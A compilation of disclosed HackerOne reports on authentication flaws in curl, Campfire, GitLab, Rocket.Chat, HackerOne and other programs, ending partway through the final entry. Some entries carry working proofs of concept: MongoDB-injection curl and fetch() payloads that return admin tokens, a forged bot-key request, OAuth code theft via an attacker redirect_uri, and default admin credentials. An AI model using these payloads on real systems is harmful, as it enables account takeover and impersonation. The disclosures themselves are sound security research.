# Improper Authentication - Generic

_123 reports — High/Critical, disclosed_

### [Negotiate Authentication Premature on Connection Reuse](https://hackerone.com/reports/3666576)

- **Report ID:** `3666576`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** curl
- **Reporter:** @sdainard
- **Bounty:** - usd
- **Disclosed:** 2026-04-29T07:15:58.327Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Curl 8.19.0+ inappropriately sends Negotiate authentication headers on reused keep-alive connections where authentication was already completed. Commit ab650379a8 (June 2025) moved negotiate auth context to on-demand metadata storage, but during connection reuse the metadata gets cleared while the connection-level state (`conn->http_negotiate_state = GSS_AUTHSUCC`) persists. When `Curl_auth_nego_get()` is called on the reused connection, it creates a fresh empty context, causing the code to treat it as a new auth attempt and inappropriately send auth headers containing credentials/tokens. This affects all Negotiate/SPNEGO (Kerberos) authentication with keep-alive connections.

## Affected version

- __Vulnerable__: curl 8.19.0 and later (released December 2025)
- __Last safe version__: < curl 8.19.0
- __Platform__: All platforms (Linux, Windows, macOS, etc.)
- __Breaking commit__: ab650379a8 "vauth: move auth structs to conn meta data" (June 9, 2025)
- __Tests failing__: test 2077, 2078 (masked by separate test server bug - see note below)

## Steps To Reproduce:

1. Build curl 8.19.0 or later with Negotiate/SPNEGO auth support enabled
2. Configure a server requiring Negotiate authentication with keep-alive connections enabled
3. Make first request with Negotiate auth: `curl --negotiate -u : http://server/resource1`
4. On same connection (keep-alive), make second request: `curl --negotiate -u : http://server/resource2`
5. __Expected__: Second request should NOT send Authorization header (auth already done)
6. __Actual__: Second request inappropriately sends "Authorization: Negotiate" header with credentials
7. Alternatively, run curl test suite: `make test` and observe tests 2077, 2078 fail

__Note__: Test failures are currently masked by a separate test server bug in `tests/server/sws.c` (line 2387: `req->connmon = FALSE;`) that prevents proper disconnect logging. This test server issue does not affect the security vulnerability itself, only its visibility in the test suite. Please see summary below.

## Technical Details:

Root cause in `lib/vauth/negotiate.c` - `Curl_auth_nego_get()` creates fresh empty context when metadata lookup fails on reused connections, breaking synchronization with `conn->http_negotiate_state`.  
Detailed analysis and proposed fix available in my  investigation notes.

## Discovery Timeline

a. While applying a CVE patch to curl 8.17.0, test 338 failed, revealing **Issue #2** (connection reuse regression in `lib/url.c`).
b. Investigating curl 8.19.0 revealed **Issue #2** was still present but tests were passing - this exposed **Issue #1** (test server masking the actual bug).
c. Before submitting Issues #1 and #2, performed additional verification to check for other potentially masked tests.
d. This verification revealed **Issue #3** (this report) - the Negotiate auth credential leakage on connection reuse. Now reporting Issue #3 while holding Issues #1 and #2 to prevent premature disclosure that could compromise security investigation.

## Related Issues Found During Investigation

**Issue #1 - Test Server Masking Bug:**
- **File**: `tests/server/sws.c`, line 2387
- **Problem**: Line `req->connmon = FALSE;` disables connection monitoring after first disconnect, preventing subsequent `[DISCONNECT]` markers with `--next` flag
- **Impact**: Masks real connection reuse bugs by making tests appear to pass when they should fail
- **Status**: Fix prepared, holding for coordinated disclosure with Issue #3

**Issue #2 - Connection Reuse Regression:**
- **File**: `lib/url.c`, function `ConnectionExists()`
- **Problem**: Missing Negotiate auth state validation in connection matching logic - connections incorrectly reused when auth states don't match
- **Impact**: Security vulnerability allowing connection reuse with mismatched authentication state
- **Status**: Pull request prepared with fix, holding for coordinated disclosure with Issue #3

Detailed analysis and patches available for both issues.

## AI Usage Disclosure

AI tools were used for code analysis verification, documentation formatting, and report preparation. Vulnerability discovery, root cause analysis, and technical investigation were performed through manual code review and testing.

## Impact

## Summary:

This vulnerability causes inappropriate disclosure of Negotiate authentication credentials on reused HTTP connections. When a curl client reuses a keep-alive connection where Negotiate/SPNEGO authentication was already completed, it incorrectly sends new Authorization headers containing Kerberos tickets/tokens. This can lead to:

1. __Credential leakage__: Authentication tokens sent when not required, potentially exposing them to network monitoring or man-in-the-middle attacks
2. __Cross-resource authentication bypass__: In connection reuse scenarios where connections are repurposed (though rare), auth credentials could be sent to unintended endpoints
3. __Protocol violations__: Violates HTTP authentication state machine by re-authenticating on connections where auth was already successful
4. __Enterprise security impact__: Particularly severe in corporate environments using Kerberos/Active Directory where Negotiate auth is the primary authentication mechanism

---

### [Improper bot-authentication allows to impersonate any user when sending messages in a room](https://hackerone.com/reports/3329310)

- **Report ID:** `3329310`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Basecamp
- **Reporter:** @stackered
- **Bounty:** 2000 usd
- **Disclosed:** 2025-11-21T19:39:42.331Z
- **CVE(s):** -

**Vulnerability Information:**

Bots are allowed to send messages in rooms but require a bot key to authenticate.
The bot key authentication function is as follows:

```ruby
def authenticate_bot(bot_key)
  bot_id, bot_token = bot_key.split("-")
  active.find_by(id: bot_id, bot_token: bot_token)
end
```

The issue is that if `bot_key` has no right-hand side (ex: `1-`), `bot_token` will be `nil`, and the query will match a `User` record if `bot_id` matches a valid ID.

IDs are incremental, as can be seen in the rails console, so they can be guessed easily. They are also visible in some URLs.

```
campfire(prod):038> User.active
=> 
[#<User:0x00007a444e940f18
  id: 1,
  name: "enoent",
  created_at: "2025-09-06 11:59:41.505220000 +0000",
  updated_at: "2025-09-06 14:08:08.788258000 +0000",
  role: "administrator",
  email_address: "[FILTERED]",
  password_digest: "[FILTERED]",
  active: true,
  bio: "<s>ddqsdqsds</s>",
  bot_token: nil>,
 #<User:0x00007a444e940dd8
  id: 2,
  name: "test",
  created_at: "2025-09-06 13:24:29.113250000 +0000",
  updated_at: "2025-09-06 13:42:26.539909000 +0000",
  role: "member",
  email_address: "[FILTERED]",
  password_digest: "[FILTERED]",
  active: true,
  bio: nil,
  bot_token: nil>,
 #<User:0x00007a444e940c98
```

The following request highlights the issue, as it allows an unauthenticated user to impersonate another user (here with ID `2`) and post messages on their behalf:

```
POST /rooms/2/2-/messages HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/vnd.turbo-stream.html, text/html, application/xhtml+xml
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 193

Hello ! I'm the test user, even though I'm not authenticated
```

The attached image shows that the message was successfully posted and appears to come from the "test" user.

## Impact

An unauthenticated user can send arbitrary messages as any user, in rooms the impersonated user have access to.

---

### [Mint Oauth2 access token for targeted user](https://hackerone.com/reports/1148364)

- **Report ID:** `1148364`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** GitLab
- **Reporter:** @timothyleung
- **Bounty:** 5580 usd
- **Disclosed:** 2025-07-23T00:06:09.923Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

It is possible to mint access token for targeted user. There is a flaw for group level application setup. It allows a group owner to create an application with user's trust by default. This bypassed the CSRF control for authorization flow. 

### Steps to reproduce


1. Login as user1 , create a group called malicious group

2. Create an Applications in Settings > Applications > api scope checked 

3. Open the created application and click Edit, intercept the request when you click "Save application", append the following 
`doorkeeper_application%5Btrusted%5D=0&doorkeeper_application%5Btrusted%5D=1& ` This will allow us to create an application that is trusted by default. This is an intended function for instance admin. 

4. Send the following link to the user, or put it in an img tag. 
https://gitlab.com/login/oauth/authorize?redirect_uri=http://<attacker-control>.com&client_id=9ff83fc426f95b5b5dec389ac02adf4ef800e4a0fb04faed6ffc8305f5fccf29&scope=api 

5. You will be able to see a request with the Code

6. You can mint the access token using the following endpoint. 
```
POST /login/oauth/access_token HTTP/1.1
Host: gdk.test:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: perf_bar_enabled=true; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltTTBaR0ZsWWpWa0xXUXdPRFV0TkRjM05TMWlPRGxtTFRVMk5UYzJORFF3WXpsa01pST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--364fb7d4479cb94e08660b9c20f6b7692c7e53a4; _gitlab_session_a577db8f7188ca777cf6a20a7928c67f45ba397ca4a4a162d17662b5e845194c=d114336bb9c2a113ff2e6d5542e17a63; known_sign_in=bGtzOVNNWWY1SitJVDBMUE5WS0VqbXBvbWRyRzhLaXdzKyt6L0FpanZIMndzYVhRUHZpYnlncjJFSFJzNEl3b0dvMlNaVEF4d25PRys4ZDFiYmgvRUpVRWRVdlVRL3YyUXNaUEx4LzExL25YTWk2KzBIUlg3dldFQlpkQ2dDL2YtLTc4cUhhZmJrK2JUckRvT0FONjBRZ1E9PQ%3D%3D--ddb6a3bf3b2faa846ab4a0b2e0ecef561f0c5a99; sidebar_collapsed=false
Upgrade-Insecure-Requests: 1
Content-Length: 223

code=6c53ef532f34762b8705029d4fd005d2c32d788d3e3a78151c1b5f6a2743dffc&client_id=04a5da53b6faaba4758fcb0e7bd80845795c9c838363568c9b4efcc0bcec1934&client_secret=9de25469a82dee694ae4e33e02a3e97156bec87ba905fc4e3e34b9de805f9dc4
```
Response
```
HTTP/1.1 200 OK
Cache-Control: max-age=0, private, must-revalidate, no-store
Content-Type: text/plain; charset=utf-8
Etag: W/"a219f8ac2bd29580e1f17894de3956da"
Pragma: no-cache
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Gitlab-Feature-Category: integrations
X-Permitted-Cross-Domain-Policies: none
X-Request-Id: 01F2E6M6TER14PB17H6XCDC0B3
X-Runtime: 0.257708
X-Ua-Compatible: IE=edge
X-Xss-Protection: 1; mode=block
Date: Sun, 04 Apr 2021 10:25:03 GMT
Content-Length: 105
Connection: close

access_token=bc3450dfcc2fb46eece85d1f74d96070f94cd35e656b184706027227243d5338&scope=api&token_type=Bearer
``` 

(Step-by-step guide to reproduce the issue, including:)

(1. any preconditions in the environment)
(2. complete HTTP or API request, or)
(3. user action, )
(4. etc.)


### Impact

I believe you can gain api scope access to any targeted user. I will try to enable more scopes later.


### What is the current *bug* behavior?

Able to obtain user's code without consent and mint access token which can be used to do things on behalf of the user.

### What is the expected *correct* behavior?

Group owner should not be able to enable trusted by default when creating application.

## Impact

Gain access to targeted user's data.

---

### [Session Replay Attack Allows Authentication Bypass via Captured Login Responses Allowing Bypass of 429 Too many attempts for Multiple Failed Logins](https://hackerone.com/reports/3120790)

- **Report ID:** `3120790`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** WakaTime
- **Reporter:** @ctrl_cipher
- **Bounty:** - usd
- **Disclosed:** 2025-05-01T19:33:10.423Z
- **CVE(s):** -

**Vulnerability Information:**

#Summary
An attacker can bypass authentication by capturing a valid login response (including session cookies/tokens) and replaying it during a failed login attempt with incorrect credentials. The server fails to invalidate or validate session tokens properly, allowing unauthorized access even after logout.

#Steps to Reproduce
1. Legitimate Login:
Send a valid login request (correct email/password).
Capture the response using Burp Suite and copy it.

2. Invalid Login:
Log out the user.
Send a new login request with an incorrect password.
Replace the 400 Bad Request response with the previously captured legitimate login response (including the valid session cookie).

3. Result:
The server grants access to the account despite the wrong password.
The attacker can now interact with the account as the legitimate user.

#Recommendations
Server-Side Session Invalidation:
Maintain a database of active sessions and revoke old tokens on logout or failed login attempts.

Token Binding:
Bind session tokens to user context (e.g., IP address, user agent hash).

Short-Lived Tokens:
Use JWT with short expiration times (e.g., 15 minutes) and refresh tokens.

Replay Attack Mitigation:
Add a unique nonce or timestamp to each login request.

Secure Cookie Attributes:
Ensure cookies include Secure, HttpOnly, SameSite=Strict, and Max-Age

## Impact

Unauthorized Account Access: Attackers can compromise any account by replaying captured session tokens.
Persistence: Old tokens remain valid indefinitely.
Data Theft/Abuse: Sensitive user data (coding activity, API keys, etc.) can be stolen or modified.

---

### [2FA Bypass leads to  impersonation of legimate users](https://hackerone.com/reports/2885636)

- **Report ID:** `2885636`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Drugs.com
- **Reporter:** @d3do
- **Bounty:** - usd
- **Disclosed:** 2025-03-14T15:30:23.950Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello team,
I have discovered a logic flaw in the authentication system that allows an attacker (User A) to impersonate a legitimate user (User B) who has not yet registered. By abusing the email change functionality and bypassing 2FA, the attacker can retain access to the account until the legitimate user resets their password.

## Steps to re-produce
1. Go to https://www.drugs.com/account/register/ and create an account using an email you own.

██████

2. Complete OTP verification and select "Trust this device for 1 month". This gives you a valid session that does not require 2FA for one month.

3. Go to https://www.drugs.com/account/details/ and change the email to the victim's email (User B)
   - Now, the attacker has a valid session associated with User B's email for one month, bypassing 2FA.

███

4. Log out and log back in to confirm that the application doesn't prompt for OTP.

### To maintain this bypass indefinitely (until the original user resets the password):
1. Change the email back to the attacker's email.

2. Re-verify the new email by completing OTP verification and selecting "Trust this device for 1 month".
3. Change the email back to the victim's email (or any other arbitrary email).

By repeating this process, the attacker can retain access without triggering 2FA.
Note that the platform only notifying the attacker to activate the account , but not Terminating the session after the email has changed successfully 

## From victim POV
1. Go to Sign Up page 
2. try to Sign up with the victim's email
3. Note that  the platform says that email's already used (while the original Owner of the email didn't  create the account) 

███████

## Impact

## Summary:

1. ** Loss of Trust:** Users will lose confidence in the platform's security if they learn attackers had  impersonated them.

2. **Impersonation Risk:** Attackers can impersonate legitimate users and interact with the platform.

3. **Email Ownership Not Protected:** The platform fails to verify the original owner of the email, allowing attackers to use it.

---

### [Yet Another OTP code Leaked in the API Response](https://hackerone.com/reports/2635315)

- **Report ID:** `2635315`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** MTN Group
- **Reporter:** @tinopreter
- **Bounty:** - usd
- **Disclosed:** 2025-01-08T10:43:03.129Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
This is much similar to my report here(https://hackerone.com/reports/2633888) , except it affects a different domain. The application requests a phone number for authentication, then sends an OTP code to the user. But the OTP is leaked in the response which defeats the whole purpose of it's implementation.



## Steps To Reproduce:

{F3486534}

## Supporting Material/References:
https://hackerone.com/reports/2633888

##Recommendation
Don't return the OTP code in the API's response

## Impact

It's possible to sign up with other users accounts. It's possible to log into other users accounts as well. Another thing I noticed is that, you can sign up with any 10-digit phone number since the OTP is in the response for you to use, makes creating junk accounts easily possible.

---

### [Unauthorized Access  Exposing Sensitive Data](https://hackerone.com/reports/2858876)

- **Report ID:** `2858876`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @moha1sd
- **Bounty:** - usd
- **Disclosed:** 2024-12-18T19:38:09.342Z
- **CVE(s):** -

**Vulnerability Information:**

The identified page allows unauthorized access to a user's profile management functionality without requiring authentication. Upon accessing the page, sensitive user details such as name, email address, and EDIPI, 10 digits are exposed. Additionally, an update function is available, suggesting potential for unauthorized data manipulation.

## Impact

Sensitive Data Exposure: Unauthorized parties can view critical personal identifiers
Data Manipulation: If the update function is exploitable  and Privacy and Security Risks

## System Host(s)
████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1- go to the website https://████/
2 - will be asking to select certificate  Just **just click cancel ** Otherwise the server will response 403 - Forbidden: Access is denied
3-  Agree to the agreement and click on ██████████ will redirect to https://█████/███████/
4- click on login 
5- will  redirect you to https://████/███████/Dashboard

## Suggested Mitigation/Remediation Actions
Implement Authentication: Enforce strict authentication requirements

---

### [Registration bypass with leaked Invite Token](https://hackerone.com/reports/1071102)

- **Report ID:** `1071102`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Rocket.Chat
- **Reporter:** @gronke
- **Bounty:** - usd
- **Disclosed:** 2024-08-10T21:58:46.526Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

Regular expressions in the `validateInviteToken` route allows unauthenticated users to guess a valid invite token, that allows them to access a private channel or register accounts on a remote server with "Secret URL" registration method enabled.

**Description:**

The API route `validateInviteToken` passes an unauthenticated clients token bodyParam to the validateInviteToken method as found in [app/api/server/v1/invites.js#L45-L62](https://github.com/RocketChat/Rocket.Chat/blob/729e258326bcd1fd0685d6d4c4755e38c9f8831d/app/api/server/v1/invites.js#L45-L62)


```javascript
API.v1.addRoute('validateInviteToken', { authRequired: false }, {
	post() {
		const { token } = this.bodyParams;

		if (!token) {
			throw new Meteor.Error('error-invalid-token', 'The invite token is invalid.', { method: 'validateInviteToken', field: 'token' });
		}

		let valid = true;
		try {
			validateInviteToken(token);
		} catch (e) {
			valid = false;
		}

		return API.v1.success({ valid });
	},
});
```

The token is then passed to `Invites.findOneById(token)` without further checks of the input data, which allows to send an Object instead of a string. This object can be a `$regex` Mongo DB query, that reduces the number of queries required to leak a valid invite token.

Once found, an attacker can navigate to `/invite/:token` to then register a new account with access to the specific channel. After initial registration, the process can be repeated to join more rooms with non-expired invites.

```sh
curl 'https://open.rocket.chat/api/v1/validateInviteToken'
  -H "content-type: application/json"
  -d '{ "token": { "$regex": ".*" } }'
```

Expired invite token might mask other token because Mongo DB only returns one document (sorted by order of insertion). A valid strategy to leak a 6 character token (case-sensitive letters and numbers) is to prefix the regex (e.g. `^a.*`, `^b.*`, etc) and check the boolean result.

## Releases Affected:

  * 3.9.4

## Steps To Reproduce (from initial installation to vulnerability):

(Add details for how we can reproduce the issue)

  1.) Leak a valid token with consecutive `validateInviteToken` checks
  2.) Browse to `/invite/:leaked_token`
  3.) Register account

## Suggested mitigation

  * validate user input to be a String

## Impact

Unauthenticated attackers can leak invite links to register new accounts, although public registration is disabled. Authenticated users might gain unauthorized access to private chat rooms.

---

### [Authentication Bypass in login-token Authentication Method](https://hackerone.com/reports/1447619)

- **Report ID:** `1447619`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Rocket.Chat
- **Reporter:** @gronke
- **Bounty:** - usd
- **Disclosed:** 2024-08-10T21:57:39.310Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

Improper input data validation in the `login-token` authentication method leads to an authentication bypass.

## Description

Data from HTTP POST requests is forwarded to hardcoded Login Handlers, including the `login-token` method defined in [app/token-login/server/login_token_server.js#L10](https://github.com/RocketChat/Rocket.Chat/blob/a06e811ceeef6f674ff8c38e49ddcf0f476d9683/app/token-login/server/login_token_server.js#L10).

```javascript
Accounts.registerLoginHandler('login-token', function (result) {
	if (!result.loginToken) {
		return;
	}

	const user = Meteor.users.findOne({
		'services.loginToken.token': result.loginToken,
	});

	if (user) {
		Meteor.users.update({ _id: user._id }, { $unset: { 'services.loginToken': 1 } });

		return {
			userId: user._id,
		};
	}
});
```

The `result.loginToken` parameter is taken from the HTTP POST requests JSON body of the `/api/v1/login` route, so that Mongo DB injection returns a valid authToken for the first matching user. 

```console
$ curl -s 'http://127.0.0.1:3000/api/login' -H "Content-Type: application/json" -d '{"loginToken": { "$exists": false }}' | head
{
  "status": "success",
  "data": {
    "userId": "rocket.cat",
    "authToken": "MnTHVIRTZfRBQiFQYzWZ1xbBlL4BUwK2-3UBWTftXpB",
    "me": {
      "_id": "rocket.cat",
      "avatarOrigin": "local",
      "name": "Rocket.Cat",
      "username": "rocket.cat",
```

Typically the first user in a Rocket.Chat MongoDB database is `rocket.cat`, which is a privileged account. This can be confirmed by using the returned secret in an API call to `/api/v1/me`:

```console
$ curl -H "x-user-id: rocket.cat" -H "x-auth-token: MnTHVIRTZfRBQiFQYzWZ1xbBlL4BUwK2-3UBWTftXpB" http://127.0.0.1:3000/api/v1/me              
{                                                                                                                                                                        
  "_id": "rocket.cat",                                                                                                                                                   
  "avatarOrigin": "local",                                                                                                                                               
  "name": "Rocket.Cat",                                                                                                                                                  
  "username": "rocket.cat",                                                                                                                                              
  "status": "away",                                                                                                                                                      
  "statusDefault": "online",                                                                                                                                             
  "utcOffset": 1,                                                                                                                                                        
  "active": true,                                                                                                                                                        
  "_updatedAt": "2022-01-12T01:45:57.208Z",                                                                                                                              
  "roles": [
    "bot"
  ],
```

When loginToken is legitimately used an attacker would need to switch the strategy from using `$empty` to `$regex` instead.

## Releases Affected:

  * 4.3.1
  * 3.18.3
  * develop

## Steps To Reproduce (from initial installation to vulnerability):

  1. Open Rocket.Chat (logged out)
  2. Open Web Inspector
  3. Run PoC Request

## Supporting Material/References:

### Proof of Concept

```javascript
fetch("/api/v1/login", {
  method: "POST",
  body: '{"loginToken": { "$exists": false }}',
  headers: {
    "Content-Type": "application/json"
  }
})
.then(res => res.json())
.then(({ data: { userId, authToken }}) => {
  console.log(`login as ${userId}`)
  Meteor._localStorage.setItem(Accounts.USER_ID_KEY, userId);
  Meteor._localStorage.setItem(Accounts.LOGIN_TOKEN_KEY, authToken);
  window.location.reload()
});
```

## Suggested mitigation

  * Validate `result.loginToken` input data in loginToken auth handler.

## Impact

Unauthenticated clients can bypass the login and obtain administrative access to the Rocket.Chat instance.

---

### [Restrict any user from Login to their account](https://hackerone.com/reports/2586616)

- **Report ID:** `2586616`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @prakhar0x01
- **Bounty:** - usd
- **Disclosed:** 2024-07-19T14:39:12.204Z
- **CVE(s):** -

**Vulnerability Information:**

Hii Triager,

I found that an attacker can change their email address to the victim's(existing user) email and restrict the victim from accessing their account.

Vulnerable Domain: `www.██████████.mil`

User-A: Attacker
User-B: Victim 

Both User-A & User-B are registered user & have their separate accounts on `www.███.mil`

## Step To Reproduce
1 - Login to Attacker's account, User-A (attacker@email.com)
2 - Login to Victim's Account, User-B (victim@email.com)
3 - In the Attacker's account, Navigate to `Update Profile`  section.
4- Change the Attacker's email to `victim@email.com`. You can successfully takeover the victim email. (not victim account)
5 - Now, Try to login as victim account(with victim email & password) , Application will Return `Invalid Credentials`

## References
████

## Impact

1 -Restric any user from accessing their account.
2 - Improper Authentication on change email fuctionality.

## System Host(s)
www.██████.mil

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1 - Login to Attacker's account, User-A (attacker@email.com)
2 - Login to Victim's Account, User-B (victim@email.com)
3 - In the Attacker's account, Navigate to `Update Profile`  section.
4- Change the Attacker's email to `victim@email.com`. You can successfully takeover the victim email. (not victim account)
5 - Now, Try to login as victim account(with victim email & password) , Application will Return `Invalid Credentials`

## Suggested Mitigation/Remediation Actions
1 - Set proper authentication on the `Update Profile` functionality

---

### [Authentication bypass and potential RCE on the https://████ due to exposed Cisco TelePresence SX80 with default credentials](https://hackerone.com/reports/684758)

- **Report ID:** `684758`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2024-07-19T14:30:38.509Z
- **CVE(s):** -

**Vulnerability Information:**

##Description
Hello. I was able to identify another one Cisco TelePresence SX80 device located on the https://████████ right near the previous device `████` (after #684070 report I decided to check ████* range)
According to the IP Info: https://ipinfo.io/AS257/████0/24 it belongs to ASN with ID 
```
AS257 ███
```

The mentioned instance has same credentials `admin:admin`.
This instance is different and less used, the logs reveals that last time device was used in 2017 year.

##POC
https://████████
Login with `admin:admin`
███████
Since we are logged in as admin, we can completely control the device and all connections, and add our startup scripts via https://███████/web/scripts thus achiecing code execution.

##Suggested fix
Change the credentials and likely you will need to reset the device to factory settings

## Impact

Potential device compromise and code execution. This devices are used mainly for trainings, briefings, and demonstration rooms, as well as auditoriums, so attacker with full control of the device potentially can intercept the data (RCE potential is interesting, but ability to silently compromise the device and use it as backdoor can be much more harmful).

---

### [Bypassing the victim's phone number OTP in the account recovery process on the https://hackerone.com/settings/auth/setup_account_recovery](https://hackerone.com/reports/2501984)

- **Report ID:** `2501984`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** HackerOne
- **Reporter:** @the-white-evil
- **Bounty:** - usd
- **Disclosed:** 2024-07-11T15:06:11.697Z
- **CVE(s):** -

**Vulnerability Information:**

### Hi Team,
Hope everyone is doing well on your end. :)

- While conducting research on hackerone.com, I uncovered a critical vulnerability related to account recovery via phone number. 
- I found that I could add any phone number without verifying the SMS OTP. 
- To confirm the vulnerability, I enabled 2FA and observed that the OTP was successfully sent to someone else's phone number. 
- Allow me to explain the details step by step.
- I halted my exploration at this point without delving into the 2FA OTP process and other aspects. My reason being, I wanted to ensure that I am the first to report this issue.

### Proof of concept:

- I have created a video demonstration of the vulnerability and uploaded it to the report and image too.
- You can review it once.

█████


### Steps To Reproduce

1. First, create an account recovery request using your own phone number and successfully enable account recovery with that same number.

███████

2. Now, click on 'Change' and replace the phone number with that of another person. Click 'Next' to initiate the verification process. However, do not verify the OTP, instead, either refresh the page or navigate back to the account recovery page.

██████

3. I was surprised to find that another person's number was now stored, and the recovery OTP was being sent to that individual's number, even though it had been modified by me. And I do not have access to that number.

4. To confirm the issue, I implemented 2FA (Two-Factor Authentication) and attempted to use the account recovery process via my phone number. Unfortunately, the attempt was unsuccessful. However, I did not let this setback deter me.

5. I logged in once more and attempted to change account recovery and got it. Now, the system prompted me to enter an SMS OTP (One-Time Password) sent to the phone number set by the attacker, which happens to be a victim's number I don't have access to.

████████

- Finally, we identified the issue, which involves exploiting the victim's phone number in the account recovery process without verifying the OTP sent to the victim's phone number.

## Impact

- The attacker can exploit the victim's phone number in the account recovery process without verifying the victim's phone number OTP, potentially flooding the victim's inbox with spam messages and overwhelming their communication channels.


### Solution:

- Accurately verifying the phone number OTP is crucial to ensuring the security of account recovery processes and preventing unauthorized access by attackers.

### Cheers!
TheWhiteEvil

---

### [Improper Authentication - 2FA OTP Reusable](https://hackerone.com/reports/2529780)

- **Report ID:** `2529780`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** HackerOne
- **Reporter:** @xklepxn
- **Bounty:** - usd
- **Disclosed:** 2024-07-11T14:40:48.215Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
I found an “Improper Authentication” issue where the 2FA OTP generated by the Microsoft Authenticator app can be used for two-step verification in HackerOne. This is similar to the common issue where tokens remain usable after logout. This means that the OTP does not have an invalidation period even if the app has generated a new OTP. 

**Description:**
OTP is generated every 30 seconds. In the POC, I let the app generate three OTPs, meaning 90 seconds  passed to let the old OTP. Supposedly, the old OTP is no longer valid because a new OTP is generated. However, I was still able to use the old OTP.

### Steps To Reproduce

1.  Set up an account that has 2FA enabled
2.  Login to the account
3.  View the otp created by the Authenticator app
4. Let the app create 3x otp (it's up to you how many you want)
5. But, the otp used is the first one 

### POC 

███████

### Reference

 * https://book.hacktricks.xyz/pentesting-web/2fa-bypass

### CVSS Explaination
* ```Privileges required: HIGH``` I admit, to accomplish this attack means that the attacker already has the victim's user credential/password data (there are many ways to do this, e.g. credential stealer etc.).
* ```CIA : HIGH ``` The success of the attacker taking over the account will have an impact on confidentiality (private programs, account data, etc.), integrity (the attacker is able to control what he wants to do with the account), Availability imagine the attacker changing the email, etc. until finally the victim has no access to the account.

But the final decision on CVSS is still up to you.

## Impact

The generated otp codes are all common as in the 6-digit otp list on github, with the reusable otp loophole, this increases the probability of successful brute force otp. In other words, the loophole impacts the takeover account.

{F3317700}

---

### [TOTP Authenticator implementation Accepts Expired Codes](https://hackerone.com/reports/2588810)

- **Report ID:** `2588810`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** HackerOne
- **Reporter:** @noob_but_cut3
- **Bounty:** - usd
- **Disclosed:** 2024-07-11T14:27:56.641Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Hi,

During testing hackerone.com, I discovered that the TOTP authenticator implementation accepts expired codes, allowing attackers to bypass authentication. This is a security vulnerability that reduces the effectiveness of the TOTP authentication mechanism.


**Description:**

TOTP (Time-Based One-Time Password) is a widely used authentication mechanism that generates a new password every 30 seconds. The password is valid for a short period, typically 30 seconds, before a new password is generated. This mechanism is designed to prevent attackers from using previously generated passwords.

During testing, I discovered that the TOTP authenticator implementation accepts expired codes, allowing attackers to bypass authentication. Specifically, I found that the authenticator accepts codes that are more than 1 minute old, which is considered a large window of acceptance.
This vulnerability reduces the security benefits of TOTP, allowing attackers to reuse expired codes. This can lead to unauthorized access to the system, which can result in data breaches, financial losses, and reputational damage.

### Steps To Reproduce

1. Enable TOTP authentication for the account at hackerone.com with google authenticator.
1. Log in to the tfa enabled account with correct password.
1. When it comes to tfa state, save the current totp code from authenticator app.
1. Wait for the code to expire (e.g., 1 minute).
1. Submit the expired code to the authentication endpoint.
1. Observe that the authentication is successful despite using an expired code.

### Suggest Fix 

1. Reduce the window of acceptance to a more secure value (e.g., 30 seconds).
1. Implement a more robust TOTP algorithm that rejects expired codes.

### Optional: Supporting Material/References (Screenshots)

 I have attached a POC video via google drive link cause it is over 250 mb.

https://drive.google.com/file/d/1onGsQvF-mmPXisjmxhkBbQUB4sbvoXz5/view?usp=sharing

## Impact

The attacker can bypass the two factor authentication by using expired otp code.

**Summary (team):**

This report describes a vulnerability in the TOTP (Time-Based One-Time Password) authenticator implementation on hackerone.com. The researcher found that the system accepts expired TOTP codes, which reduces the effectiveness of the two-factor authentication mechanism. Specifically, the system allows using TOTP codes that are over 1 minute old, which is considered an insecure window of acceptance.

By accepting expired codes, an attacker could potentially reuse old TOTP codes to bypass the 2FA authentication, leading to unauthorized access. The researcher provided steps to reproduce the issue and suggested reducing the acceptance window to 30 seconds and implementing a more robust TOTP algorithm that rejects expired codes.

While the HackerOne team acknowledged the report, they stated that there doesn't appear to be a significant security risk or impact, as an attacker would still need the user's credentials and wouldn't be able to brute force the 6-digit TOTP code within 1 minute.

---

### [Email OTP/2FA Bypass](https://hackerone.com/reports/2315420)

- **Report ID:** `2315420`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
